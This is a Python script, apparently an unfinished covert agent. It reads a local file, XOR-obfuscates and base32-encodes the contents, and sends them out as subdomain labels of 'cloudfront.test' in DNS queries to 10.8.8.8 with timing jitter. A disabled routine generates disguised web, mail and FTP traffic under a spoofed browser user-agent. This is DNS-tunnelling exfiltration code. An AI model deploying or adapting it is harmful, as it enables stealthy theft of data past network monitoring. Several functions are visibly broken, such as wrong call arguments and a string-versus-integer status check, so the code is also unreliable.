#TODO: Uptime logging. Stats logging. Agent ID. Crosscheck.

#!/bin/python3

from http.client import *
from smtplib import *
from ftplib import *
from multiprocessing import Process
from pprint import pprint
from scapy.all import *
import os, random, sys, configparser, re, threading, string, time, base64, ast, json

stats = {}
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:10.0)Gecko/20100101 Firefox/10.0', 'accept-encoding': '*'}
jitter = random.randint(1,2) # TODO set in config

class url_action(threading.Thread):
	def __init__(self, uri, headers):
		threading.Thread.__init__(self)
		self.uri = uri
		self.response_content = None
		self.daemon = False
		self.headers = headers

	def run(self):
		while self.response_content is None:
			self.t = self.new_connection(self)
			self.t.request('GET', '/', self.headers)
			self.response_content = self.t.getresponse()
			if self.response_content.status == "200":
				stats['urls'][self.uri]['success_count'] += 1
			else:
				stats['urls'][self.uri]['failure_count'] += 1

	def new_connection(self):
		if self.uri.split(':')[0] == "https":
			return HTTPSConnection(self.uri, context=ssl._create_unverified_context())
		elif self.uri.split(':')[0] == "http":
			return HTTPConnection(self.uri)
		elif self.uri.split(':')[0] == "mailto":
			return SMTP(self.uri.split('@')[1])
		elif self.uri.split(':')[0] == "ftp":
			return FTP(self.uri.split(':')[1])

def post_data(input, agent_id):
	for item in input:
		try:
			sr1(IP(dst='10.8.8.8')/UDP(dport=53,sport=random.randrange(1025,65525))/DNS(rd=1,id=agent_id,qd=DNSQR(qname=item)),verbose=False,timeout=0.0005)
		except:
			print('well fuck')
		time.sleep(jitter)

def report_stats(temp):
	agent_id = random.randint(0,65535)
	with open('foo.txt') as f: # TODO: Unfuck this, add proper stats horseshit
		temp = json.load(f)
	output = []
	seed = random.choice(string.ascii_lowercase + string.digits)
			#for url in stats['urls']:
	#	temp.append(str(url) + ',' + url['success_count'] + ',' + url['failure_count'] + ';')
	y = [ ord(i) ^ ord(seed) for i in str(temp) ]
	z = encode(str(y).encode()).decode()
	v = str(len(str(z)))
	while len(str(v)) < 8:
		v = '0' + v
	x = (seed + ''.join(v) + z).encode()
	w = str(x).count('=')
	x = (x.decode()[:1] + str(w) + x.decode()[1:]).encode()
	chunks = [ x[i:i+14] for i in range(0, len(x), 14)]
	for stat_url in chunks:
		stat_url = stat_url.decode().replace('=','').encode()
		length = len(stat_url.decode())
		if length == 0:
			continue
		if length != 14:
			if stat_url.decode()[-1:] == "0":
				stat_url = (stat_url.decode() + '9').encode()
			stat_url = (stat_url.decode() + (''.join(["0" for _ in range(14 - length)]))).encode()
		stats_url = 'https://' + stat_url.decode().lower() + '.cloudfront.test'
		#time.sleep(random.randrange(0,3))
		#url_action(stats_url, headers).start()
		output.append(stats_url) #.decode().lower())
	post_data(output, agent_id)

def encode(input):
  return base64.b32encode(input)

def main():
	config = configparser.ConfigParser()
	config.read('config')
	while True:
		url_action(random.choice(config['standard']['urls'].keys()))
		time.sleep(random.randrange(0,150))

if __name__ == "__main__":
	process1 = Process(target=report_stats, args=(300,))
	process2 = Process(target=main)
	process1.start()
	#process2.start()
